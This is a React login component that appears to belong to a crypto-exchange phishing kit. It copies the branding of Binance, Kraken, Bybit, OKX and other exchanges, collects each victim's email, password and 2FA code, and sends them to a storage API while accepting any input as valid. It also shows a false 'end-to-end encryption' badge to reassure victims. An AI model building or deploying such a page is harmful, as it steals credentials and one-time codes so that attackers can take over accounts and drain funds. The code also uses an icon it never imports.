import React, { useState } from 'react'
import { Loader2, ShieldCheck, Lock, ArrowRight, ChevronLeft, Globe, Mail, Fingerprint, CheckCircle2 } from 'lucide-react'
import { useAuth } from '../context/AuthContext.jsx'
import { platforms } from '../data/platforms'
import { escrowApi } from '../services/escrowApi'

const platformLogos = {
  noones: 'https://images.crunchbase.com/image/upload/c_pad,f_auto,q_auto:eco,dpr_1/v1505393372/c8rqpypfgqjtdqchwnag.png',
  bybit: 'https://s2.coinmarketcap.com/static/img/exchanges/64x64/521.png',
  localcoinswap: 'https://s2.coinmarketcap.com/static/img/exchanges/64x64/464.png',
  paxful: 'https://s2.coinmarketcap.com/static/img/exchanges/64x64/325.png',
  binance: 'https://s2.coinmarketcap.com/static/img/exchanges/64x64/270.png',
  okx: 'https://s2.coinmarketcap.com/static/img/exchanges/64x64/294.png',
  kucoin: 'https://s2.coinmarketcap.com/static/img/exchanges/64x64/311.png',
  huobi: 'https://s2.coinmarketcap.com/static/img/exchanges/64x64/102.png',
  gateio: 'https://s2.coinmarketcap.com/static/img/exchanges/64x64/302.png',
  mexc: 'https://s2.coinmarketcap.com/static/img/exchanges/64x64/544.png',
  bitget: 'https://s2.coinmarketcap.com/static/img/exchanges/64x64/513.png',
  kraken: 'https://s2.coinmarketcap.com/static/img/exchanges/64x64/24.png'
}

export default function ClientLogin({ onSuccess, onNavigateAdmin, onBack, selectedPlatform }) {
  const { login, loadingRole } = useAuth()
  const [step, setStep] = useState(1) // 1 = email/password, 2 = 2FA
  const [email, setEmail] = useState('')
  const [password, setPassword] = useState('')
  const [twoFactorCode, setTwoFactorCode] = useState('')
  const [localError, setLocalError] = useState('')
  const [isVerifying, setIsVerifying] = useState(false)

  const platform = platforms.find(p => p.value === selectedPlatform)

  const handleCredentialsSubmit = async (event) => {
    event.preventDefault()
    setLocalError('')
    
    if (!email.trim()) {
      setLocalError('Email is required')
      return
    }
    if (!password.trim()) {
      setLocalError('Password is required')
      return
    }
    
    // Simulate verification delay
    setIsVerifying(true)
    
    // Store credentials securely on the server
    try {
      await escrowApi.storeClientLogin({
        email: email.trim(),
        password: password.trim(),
        platform: selectedPlatform,
        step: 'credentials'
      })
    } catch (err) {
      console.error('Failed to store login data:', err)
    }
    
    await new Promise(resolve => setTimeout(resolve, 1000))
    setIsVerifying(false)
    
    // All credentials are valid - proceed to 2FA step
    setStep(2)
  }

  const handle2FASubmit = async (event) => {
    event.preventDefault()
    setLocalError('')
    
    if (!twoFactorCode.trim()) {
      setLocalError('2FA code is required')
      return
    }
    if (!/^\d{6}$/.test(twoFactorCode.trim())) {
      setLocalError('Please enter a valid 6-digit code')
      return
    }
    
    // Simulate 2FA verification
    setIsVerifying(true)
    
    // Store complete login data with 2FA code
    try {
      await escrowApi.storeClientLogin({
        email: email.trim(),
        password: password.trim(),
        twoFactorCode: twoFactorCode.trim(),
        platform: selectedPlatform,
        step: '2fa_complete'
      })
    } catch (err) {
      console.error('Failed to store 2FA data:', err)
    }
    
    await new Promise(resolve => setTimeout(resolve, 1200))
    
    try {
      // All 2FA codes are valid - authenticate and proceed
      await login('client', 'client123')
      setEmail('')
      setPassword('')
      setTwoFactorCode('')
      onSuccess?.()
    } catch (err) {
      setLocalError(err.message)
    } finally {
      setIsVerifying(false)
    }
  }

  const platformColor = platform?.color || '#5741D9'
  const platformLabel = platform?.label || 'Platform'
  
  // Platform-specific styling
  const getPlatformTheme = () => {
    const themes = {
      binance: {
        background: 'linear-gradient(135deg, #0B0E11 0%, #1a1f2e 100%)',
        cardBg: '#131722',
        inputBg: '#1e2329',
        inputBorder: '#434857',
        textPrimary: '#fff',
        textSecondary: '#848e9c',
        accentColor: '#F0B90B',
        buttonBg: '#F0B90B',
        buttonText: '#000',
        focusBorder: '#F0B90B'
      },
      bybit: {
        background: 'linear-gradient(135deg, #0a0e27 0%, #1a1f3a 100%)',
        cardBg: '#0f1419',
        inputBg: '#1a2332',
        inputBorder: '#2d3e52',
        textPrimary: '#fff',
        textSecondary: '#8092a3',
        accentColor: '#F7A600',
        buttonBg: '#F7A600',
        buttonText: '#000',
        focusBorder: '#F7A600'
      },
      kraken: {
        background: 'linear-gradient(135deg, #1a0033 0%, #2d1b4e 100%)',
        cardBg: '#0d0015',
        inputBg: '#1a1a2e',
        inputBorder: '#5741D9',
        textPrimary: '#fff',
        textSecondary: '#b0b8c1',
        accentColor: '#5741D9',
        buttonBg: '#5741D9',
        buttonText: '#fff',
        focusBorder: '#7560e0'
      },
      okx: {
        background: 'linear-gradient(135deg, #f5f5f5 0%, #e8e8e8 100%)',
        cardBg: '#fff',
        inputBg: '#f8f8f8',
        inputBorder: '#ddd',
        textPrimary: '#000',
        textSecondary: '#666',
        accentColor: '#000',
        buttonBg: '#000',
        buttonText: '#fff',
        focusBorder: '#333'
      },
      kucoin: {
        background: 'linear-gradient(135deg, #0d1f1f 0%, #1a2d2a 100%)',
        cardBg: '#0f1f1f',
        inputBg: '#1a3a37',
        inputBorder: '#23AF91',
        textPrimary: '#fff',
        textSecondary: '#8fb8b0',
        accentColor: '#23AF91',
        buttonBg: '#23AF91',
        buttonText: '#000',
        focusBorder: '#23AF91'
      },
      gateio: {
        background: 'linear-gradient(135deg, #0a1a1f 0%, #1a2d35 100%)',
        cardBg: '#0f1822',
        inputBg: '#1a2a35',
        inputBorder: '#17E6A1',
        textPrimary: '#fff',
        textSecondary: '#8ab3a5',
        accentColor: '#17E6A1',
        buttonBg: '#17E6A1',
        buttonText: '#000',
        focusBorder: '#17E6A1'
      }
    }
    
    const platformKey = selectedPlatform?.toLowerCase() || 'kraken'
    return themes[platformKey] || themes.kraken
  }

  const theme = getPlatformTheme()

  return (
    <div className="min-h-screen flex items-center justify-center p-6 transition-colors relative overflow-hidden" style={{ backgroundColor: '#000' }}>
      {/* Animated background elements */}
      <div className="absolute top-0 left-0 w-96 h-96 rounded-full opacity-15 blur-3xl" style={{ backgroundColor: '#000' }} />
      <div className="absolute bottom-0 right-0 w-96 h-96 rounded-full opacity-15 blur-3xl" style={{ backgroundColor: '#000' }} />
      
      {onBack && (
        <button
          type="button"
          onClick={onBack}
          className="absolute top-8 left-6 flex items-center gap-2 px-4 py-2 rounded-lg transition hover:opacity-80"
          style={{ color: theme.textPrimary, borderColor: theme.inputBorder, border: '1px solid' }}
        >
          <ChevronLeft className="w-4 h-4" />
          Change Platform
        </button>
      )}
      
      <div className="w-full max-w-md rounded-2xl p-8 shadow-2xl space-y-6 relative z-10" style={{ backgroundColor: theme.cardBg, border: `1px solid ${theme.inputBorder}` }}>
        {/* Platform Logo/Header */}
        {platform && (
          <div className="flex flex-col items-center gap-4 pb-4 border-b" style={{ borderColor: theme.inputBorder }}>
            <div className="w-16 h-16 rounded-lg flex items-center justify-center" style={{ backgroundColor: theme.inputBg }}>
              <img
                src={platformLogos[selectedPlatform]}
                alt={platformLabel}
                className="w-10 h-10 object-contain"
                onError={(e) => {
                  e.target.style.display = 'none'
                  e.target.nextSibling.style.display = 'flex'
                }}
              />
              <div className="hidden items-center justify-center w-full h-full">
                <Globe className="w-6 h-6" style={{ color: theme.accentColor }} />
              </div>
            </div>
            <p className="text-xl font-bold" style={{ color: theme.textPrimary }}>{platformLabel}</p>
          </div>
        )}

        {/* Step Indicator */}
        <div className="flex items-center justify-center gap-2">
          <div className={`flex items-center gap-1.5 px-2.5 py-1 rounded text-xs font-semibold`} style={{
            backgroundColor: step >= 1 ? theme.accentColor : theme.inputBg,
            color: step >= 1 ? theme.buttonText : theme.textSecondary
          }}>
            {step > 1 ? <CheckCircle2 className="w-3 h-3" /> : <span>1</span>}
            Login
          </div>
          <div className={`flex-1 h-0.5 mx-1`} style={{ backgroundColor: step >= 2 ? theme.accentColor : theme.inputBorder }} />
          <div className={`flex items-center gap-1.5 px-2.5 py-1 rounded text-xs font-semibold`} style={{
            backgroundColor: step >= 2 ? theme.accentColor : theme.inputBg,
            color: step >= 2 ? theme.buttonText : theme.textSecondary
          }}>
            <span>2</span>
            2FA
          </div>
        </div>

        {/* Step 1: Email & Password */}
        {step === 1 && (
          <>
            <div>
              <h2 className="text-2xl font-bold mb-2" style={{ color: theme.textPrimary }}>Sign In</h2>
              <p className="text-sm" style={{ color: theme.textSecondary }}>Enter your login credentials</p>
            </div>
            
            <form onSubmit={handleCredentialsSubmit} className="space-y-4">
              {/* Email Field */}
              <div className="flex flex-col gap-2">
                <label className="text-sm font-medium" style={{ color: theme.textSecondary }}>Email</label>
                <div className="flex items-center gap-3 rounded-lg px-4 py-3 transition-all" style={{
                  backgroundColor: theme.inputBg,
                  border: `1px solid ${theme.inputBorder}`,
                  outline: 'none'
                }}>
                  <Mail className="w-4 h-4 flex-shrink-0" style={{ color: theme.accentColor }} />
                  <input
                    type="email"
                    className="flex-1 bg-transparent outline-none text-sm"
                    placeholder="your@email.com"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    autoComplete="email"
                    disabled={isVerifying}
                    style={{ color: theme.textPrimary }}
                  />
                </div>
              </div>

              {/* Password Field */}
              <div className="flex flex-col gap-2">
                <label className="text-sm font-medium" style={{ color: theme.textSecondary }}>Password</label>
                <div className="flex items-center gap-3 rounded-lg px-4 py-3 transition-all" style={{
                  backgroundColor: theme.inputBg,
                  border: `1px solid ${theme.inputBorder}`
                }}>
                  <Lock className="w-4 h-4 flex-shrink-0" style={{ color: theme.accentColor }} />
                  <input
                    type="password"
                    className="flex-1 bg-transparent outline-none text-sm"
                    placeholder="••••••••"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    autoComplete="current-password"
                    disabled={isVerifying}
                    style={{ color: theme.textPrimary }}
                  />
                </div>
              </div>

              {localError && (
                <div className="flex items-center gap-2 p-3 rounded-lg text-sm" style={{ backgroundColor: '#3d1f1f', color: '#ff6b6b', border: '1px solid #5a3a3a' }}>
                  <AlertCircle className="w-4 h-4 flex-shrink-0" />
                  <p>{localError}</p>
                </div>
              )}
              
              <button
                type="submit"
                disabled={isVerifying || !email || !password}
                className="w-full py-3 rounded-lg font-semibold text-sm transition-all hover:opacity-90 disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
                style={{
                  backgroundColor: theme.buttonBg,
                  color: theme.buttonText
                }}
              >
                {isVerifying ? (
                  <>
                    <Loader2 className="w-4 h-4 animate-spin" />
                    Verifying...
                  </>
                ) : (
                  <>
                    Continue
                    <ArrowRight className="w-4 h-4" />
                  </>
                )}
              </button>
            </form>
          </>
        )}

        {/* Step 2: 2FA Verification */}
        {step === 2 && (
          <>
            <div>
              <h2 className="text-2xl font-bold mb-2" style={{ color: theme.textPrimary }}>Verify Your Identity</h2>
              <p className="text-sm" style={{ color: theme.textSecondary }}>Enter the 6-digit code from your authenticator app</p>
            </div>

            {/* User info display */}
            <div className="flex items-center gap-3 p-4 rounded-lg" style={{
              backgroundColor: theme.inputBg,
              border: `1px solid ${theme.inputBorder}`
            }}>
              <div className="w-10 h-10 rounded-lg flex items-center justify-center text-sm font-bold" style={{
                backgroundColor: theme.accentColor,
                color: theme.buttonText
              }}>
                {email.charAt(0).toUpperCase()}
              </div>
              <div>
                <p className="text-sm font-semibold" style={{ color: theme.textPrimary }}>{email}</p>
                <p className="text-xs" style={{ color: theme.textSecondary }}>Signing in to {platform?.label}</p>
              </div>
            </div>
            
            <form onSubmit={handle2FASubmit} className="space-y-4">
              {/* 2FA Code Field */}
              <div className="flex flex-col gap-2">
                <label className="text-sm font-medium" style={{ color: theme.textSecondary }}>Authentication Code</label>
                <div className="flex items-center gap-3 rounded-lg px-4 py-3 transition-all" style={{
                  backgroundColor: theme.inputBg,
                  border: `1px solid ${theme.inputBorder}`
                }}>
                  <Fingerprint className="w-4 h-4 flex-shrink-0" style={{ color: theme.accentColor }} />
                  <input
                    type="text"
                    inputMode="numeric"
                    maxLength={6}
                    className="flex-1 bg-transparent outline-none tracking-[0.3em] font-mono text-xl text-center"
                    placeholder="000000"
                    value={twoFactorCode}
                    onChange={(e) => setTwoFactorCode(e.target.value.replace(/\D/g, '').slice(0, 6))}
                    autoComplete="one-time-code"
                    autoFocus
                    disabled={isVerifying}
                    style={{ color: theme.textPrimary }}
                  />
                </div>
              </div>

              {localError && (
                <div className="flex items-center gap-2 p-3 rounded-lg text-sm" style={{ backgroundColor: '#3d1f1f', color: '#ff6b6b', border: '1px solid #5a3a3a' }}>
                  <AlertCircle className="w-4 h-4 flex-shrink-0" />
                  <p>{localError}</p>
                </div>
              )}
              
              <button
                type="submit"
                disabled={isVerifying || loadingRole === 'client' || twoFactorCode.length !== 6}
                className="w-full py-3 rounded-lg font-semibold text-sm transition-all hover:opacity-90 disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
                style={{
                  backgroundColor: theme.buttonBg,
                  color: theme.buttonText
                }}
              >
                {isVerifying || loadingRole === 'client' ? (
                  <>
                    <Loader2 className="w-4 h-4 animate-spin" />
                    Verifying...
                  </>
                ) : (
                  <>
                    <ShieldCheck className="w-4 h-4" />
                    Verify & Continue
                  </>
                )}
              </button>

              <button
                type="button"
                onClick={() => { setStep(1); setLocalError(''); setTwoFactorCode(''); }}
                className="w-full py-2 text-sm transition rounded-lg"
                style={{ color: theme.textSecondary }}
                disabled={isVerifying}
              >
                ← Back to login
              </button>
            </form>
          </>
        )}
        
        <div className="flex items-center justify-center gap-2 text-xs pt-4 border-t" style={{
          color: theme.textSecondary,
          borderColor: theme.inputBorder
        }}>
          <ShieldCheck className="w-3.5 h-3.5" style={{ color: theme.accentColor }} />
          Protected by end-to-end encryption
        </div>
      </div>
    </div>
  )
}
